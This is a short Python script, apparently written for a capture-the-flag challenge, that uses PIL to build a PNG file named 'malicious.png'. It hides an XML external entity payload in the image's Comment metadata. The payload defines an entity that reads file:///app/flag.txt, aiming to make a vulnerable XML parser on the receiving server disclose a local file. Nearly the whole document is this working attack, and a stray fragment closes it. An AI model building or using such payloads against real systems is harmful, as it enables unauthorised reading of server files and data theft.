from PIL import Image, PngImagePlugin
import io

image = Image.new('RGB', (100, 100), color = 'red')

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<foo>&xxe;</foo>
"""

# Embed the payload in the Comment field
meta = PngImagePlugin.PngInfo()
meta.add_text("Comment", xxe_payload)

# Save the image to a BytesIO object
image_bytes = io.BytesIO()
image.save(image_bytes, "PNG", pnginfo=meta)
image_bytes.seek(0)

# Save the image to a file
with open("malicious.png", "wb") as f:
    f.write(image_bytes.read())

    #malicious.png64511